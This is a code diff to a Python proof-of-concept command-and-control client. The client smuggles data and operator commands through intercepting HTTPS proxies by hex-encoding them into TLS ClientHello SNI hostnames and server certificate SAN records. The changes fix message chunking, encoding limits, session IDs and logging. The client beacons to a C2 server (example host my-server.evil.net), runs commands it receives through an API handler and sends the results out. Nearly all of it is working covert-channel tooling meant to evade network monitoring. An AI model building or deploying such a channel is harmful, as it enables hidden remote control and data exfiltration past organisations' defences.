@@ -14,18 +14,21 @@ PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS H
     Use *Client Hello Server Name Indication (SNI) Field* to smuggle Messages
 
     Format: {MESSAGE}.tld
-        Where `.tld` is a random generated TLD of MAX LEN 4 chars (4 bytes)
+        Where `.tld` is a random generated TLD of MAX LEN 4 chars (4 CHARS)
 
-    NOTE: MAX LEN of an SNI FIELDS is 255 bytes. Our random TLD consumes 5 of those bytes (including the '.' char)
-        Thus, MAX_MSG_LEN = 250 bytes
+    NOTE: MAX LEN of an SNI FIELDS is 255 CHARS Which equals 127 Bytes
+        Our random TLD consumes 5 of those CHARS (including the '.' char)
+        Thus, MAX_MSG_LEN = ** 250 ** CHARS or ** 125 ** bytes
     
     NOTE: Messages being packed into the SNI are converted to ASCII HEX strings.
         Thus, a message before packing will result in a 2x message length after being packed.
+        Hence the max limits of 125 chars (each char being 2 bytes in length)
+        Ex. str('c').encode().hex() == '63' <-- Thats 2 Chars.
 
-    Example: A raw message of "hello" which has a length of 5 bytes will result in:
+    Example: A raw message of "hello" which has a length of 5 chars will result in:
         >>> make_sni(b"hello" + _get_random_tld())
             '68656c6c6f.kshf'
-        Which has a total length of 15 bytes
+        Which has a total length of 15 chars after hex encoding and appending a our random tld
             [ MSG_LEN*2 + MAX_TLD_LEN = TOTAL_MSG_LEN ]
 
 """
@@ -45,10 +48,10 @@ import sys
 from protocol import *
 
 NS_TO_MS = 1000000
-MAX_SNI_LEN = 255  # MAX LEN of SNI field value
+MAX_SNI_LEN = 255  # MAX LEN of SNI field value in terms of BYTES
 MAX_TLD_LEN = 4  # Our random TLD generator max char length
 SNI_PADDING_LEN = 3  # To have an RFC Compliant hostname, nodes can be no longer than 63 chars
-MAX_MSG_LEN = MAX_SNI_LEN - MAX_TLD_LEN - SNI_PADDING_LEN - 1  # == 247 bytes
+MAX_MSG_LEN = MAX_SNI_LEN - MAX_TLD_LEN - SNI_PADDING_LEN - 2  # == 246 bytes
 
 POLL_INTERVAL = 10  # seconds for how often we send a heartbeat to the server
 MAX_RETRIES = 5  # Max num of times we will retry sending a message before giving up
@@ -103,12 +106,14 @@ class Session:
         self.is_connected = False
         self.result_msg = ""
         self.is_heartbeat_active = False
+        self.session_id = API.gen_session_id()
         self.heartbeat_thread = None
         self.heartbeats_missed = 0
         self.rtt_ms = 0  # round trip time to send and recv and ack for our message
         self.bytes_sent = 0
         self.client_id = b""
         self.last_poll_time = 0
+        self.message_list = []
         init_result = self._connect_init(server, proxy)
         if not init_result:
             return
@@ -135,7 +140,7 @@ class Session:
         else:
             self.is_connected = True
         if self.is_connected:
-            self.last_poll_time = time.ctime()
+            self.last_poll_time = int(time.time())
             # We should now have an established connection to our C2 Server now!
             self.result_msg = "OK"
             # Start up our Heatbeat in a seperate thread
@@ -184,7 +189,7 @@ class Session:
                 else:
                     self.result_msg = "OK"
                     self.heartbeats_missed = 0
-                    self.last_poll_time = time.ctime()
+                    self.last_poll_time = int(time.time())
                     self.is_connected = True
                 if self.heartbeats_missed > 4:
                     self.heartbeats_missed = 0
@@ -192,8 +197,17 @@ class Session:
                 # Check if the server wants us to do anything
                 if msg_type == ServerMessage.CMD_AVAILABLE:
                     # grab whatever is in the SNI and send it to the API
-                    api_result = API.client_handle(self._parse_server_hello(response))
+                    msg = self._parse_server_hello(response)
+                    msg_text = ""
+                    try:
+                        msg_text = msg.decode()
+                    except:
+                        msg_text = msg.hex()
+                    api_result = API().client_handle(msg)
                     self.send(api_result)
+                    self.message_list.append(
+                        f"RECV < [[ {len(msg)} bytes; msg_type={msg_type.hex()}; request= ` {msg_text[:50]} ` ]]"
+                    )
 
     def send(self, message: bytes) -> bool:
         """This is our abstracted sender method
@@ -213,33 +227,46 @@ class Session:
         total_rtt = 0
         # TODO: This function takes a bytes object, which means if `message` is LARGE.. that lives in memory for a time
         # TODO: Need to code up a sender that will stream chunks, and thus consume far less memory. (complicated)
-        chunks = [message[i : i + MAX_MSG_LEN] for i in range(0, len(message), MAX_MSG_LEN)]
+        #
+        # NOTE: Here is the tricky part. If we are sending just raw bytes, hex cnoding will result in the Same Size message
+        # NOTE: In other words, hex encoding has no penelty on our MAX_MSG_LEN
+        # NOTE: HOWEVER, sending strings, hex encoding DOUBLEs the char len of the string
+        # NOTE: Ex. A single char 'c', >>> str('c').encode().hex() == '63' <- that's two chars :(
+        # NOTE: This all means.. our SNI smuggled payload is HALVED. This is the cost of doing business.
+        # test out what hex encoding will do to us:
+        max_msg_len = MAX_MSG_LEN
+        if len(message.hex()) > len(message):
+            max_msg_len = int(MAX_MSG_LEN / 2)
+        chunks = [message[i : i + max_msg_len] for i in range(0, len(message), max_msg_len)]
+
+        # TODO: This appears to finally work, but.. keep an eye on it!!
+
         chunks_last_index = len(chunks) - 1
         smuggle = Message()
-        smuggle.header = self.client_id
         for k, v in enumerate(chunks):
             if k == chunks_last_index:
-                smuggle.header = smuggle.header + ClientMessage.RESPONSE
+                smuggle.header = self.client_id + ClientMessage.RESPONSE
             else:
-                smuggle.header = smuggle.header + ClientMessage.FRAGMENT
-            smuggle.body = (
-                struct.pack(">L", len(v))
-                + struct.pack(">L", k)
-                + struct.pack(">L", smuggle.compute_crc(v))
-                + smuggle.padding
-            )
-            self._set_tls_client_hello(smuggle, self._make_sni(v))
+                smuggle.header = self.client_id + ClientMessage.FRAGMENT
+            smuggle.body = struct.pack(">L", len(v)) + struct.pack(">L", k) + struct.pack(">L", smuggle.compute_crc(v))
+            smuggle.body = smuggle.body + self.session_id
+            # print("DEBUG")
+            # print(f"DEBUG_fragment_len:{len(v)}")
+            # print(f"DEBUG_fragment_index:{k}")
+            # print(f"DEBUG_header:{smuggle.header.hex()}")
+            # print("DEBUG")
+            self._set_tls_client_hello(smuggle.to_bytes(), self._make_sni(v))
             for i in range(MAX_RETRIES):
                 if i == MAX_RETRIES - 1:
-                    self.result_msg("Failed to resend message - Max retries reached")
+                    self.result_msg = "Failed to resend message - Max retries reached"
                     return False
                 response = self._send_message()
                 proto_header = self._get_protocol_header(response)
-                msg_typ = Message.get_msg_type(proto_header)
-                if msg_typ == ServerMessage.CRC_ERROR:
+                msg_type = Message().get_msg_type(proto_header)
+                if msg_type == ServerMessage.CRC_ERROR:
                     continue
-                if msg_typ != ServerMessage.ACK:
-                    self.result_msg("Server responded with an unexpected message: " + str(msg_typ))
+                if msg_type != ServerMessage.ACK:
+                    self.result_msg = "Server responded with an unexpected message: " + str(msg_type)
                     return False
                 break
             # end for(retries)
@@ -247,13 +274,24 @@ class Session:
         # end for(chunks)
         self.rtt = total_rtt
         self.bytes_sent = len(message)
+        msg_text = ""
+        try:
+            msg_text = message.decode().replace("\n", "\\n")
+        except:
+            msg_text = message.hex()
+        ellipse = ""
+        if len(msg_text) > 65:
+            ellipse = "...[truncated]"
+        self.message_list.append(
+            f"SEND > [[ {self.bytes_sent} bytes; rtt={self.rtt}s; msg_type={smuggle.get_msg_type(proto_header).hex()}; response= ` {msg_text[:65]+ellipse} ` ]]"
+        )
+        self.is_heartbeat_active = True
         return True
 
     def _set_tls_client_hello(self, header: bytes, body: bytes) -> None:
-        if len(body) > MAX_MSG_LEN:
-            print(
-                f"ERROR: Encoded message length of {len(body)} (original length was {len(body)}) exceeds MAX_LEN of {MAX_MSG_LEN}"
-            )
+        # NOTE: MAX_SNI_LEN + 9 because 9 bytes are used for SNI fields headers, not msg.
+        if len(body) > (MAX_SNI_LEN + 9):
+            print(f"ERROR: Encoded message length of {len(body)} exceeds MAX_LEN of {MAX_SNI_LEN}")
             raise NotImplementedError
         self.tls_client_hello[20] = self._get_alpn()
         self.tls_client_hello[19] = self._get_ec_algorithms()
@@ -278,8 +316,6 @@ class Session:
         Takes a string message and returns a Tuple of bytes cooresponding to SNI and random field in the TLS record
         """
         hex_msg = self._str_to_hex(message)
-        # TODO: This breaks if host/labels are longer than 63 chars!
-        # TODO: FIX THIS!
         # need to ensure that each 'label' contains max 63 chars
         # sliced = [hex_msg[x : x + 63] for x in range(0, len(hex_msg), 63)]
         # hex_msg = ".".join(sliced)
@@ -339,7 +375,7 @@ class Session:
     def _make_sni(self, message: bytes) -> bytes:
         hex_str = message.hex()
         # Per RFC, a hostname cannot be longer than 63 chars. So seperate with '.' as needed
-        ".".join(hex_str[i : i + 63] for i in range(0, len(hex_str), 63))
+        hex_str = ".".join(hex_str[i : i + 63] for i in range(0, len(hex_str), 63))
         hex_str = hex_str + self._get_random_tld()
         str_len = len(hex_str)
         hostname_len = struct.pack(">H", str_len)
@@ -432,9 +468,9 @@ class Session:
             print(f"[!] Failed to parse Response - Not a valid TLS Hanshake message!")
             return ""
         san_records_hex = self._find_san_records(self._extract_certs(hex_array, position))
-        message = ""
+        message = b""
         for hex_record in san_records_hex:
-            message = message + bytes.fromhex("".join(bytes.fromhex(hex_record).decode().split(".")[:-1]))
+            message = message + bytes.fromhex("".join(bytes.fromhex(hex_record).decode().split(".")[:-2]))
         return message
 
     def _get_protocol_header(self, response_bytes: bytes) -> bytes:
@@ -592,6 +628,13 @@ if __name__ == "__main__":
         required=True,
         help="Target C2 Server you want to connect to, Example: my-server.evil.net",
     )
+    arg_parse.add_argument(
+        "-v",
+        "--verbose",
+        action="store_true",
+        required=False,
+        help="Print out all request and response sent/rcvd",
+    )
     # Validate the the args provided
     args = arg_parse.parse_args()
     if not args.proxy and not args.direct:
@@ -634,11 +677,20 @@ if __name__ == "__main__":
     # Now that our client is up, we periodically update the console with heartbeat status and any commands that may come in form the server
     try:
         while True:
-            print(
-                f"    Last Poll: {session.last_poll_time}; RTT: {session.rtt}ms; Last Message: '{session.result_msg}'",
-                end="\r",
-            )
-            sys.stdout.flush()
+            sys.stdout.write("\033[K")
+            if session.message_list and args.verbose:
+                if nl:
+                    print()
+                    nl = False
+                print(session.message_list.pop())
+            else:
+                nl = True
+                print(
+                    f"    Last Poll: {int(time.time()) - session.last_poll_time} seconds ago; RTT: {session.rtt}ms; Last Message: '{session.result_msg}'",
+                    end="\r",
+                )
+                sys.stdout.flush()
+            nl = False
             time.sleep(1)
     except KeyboardInterrupt:
         print()
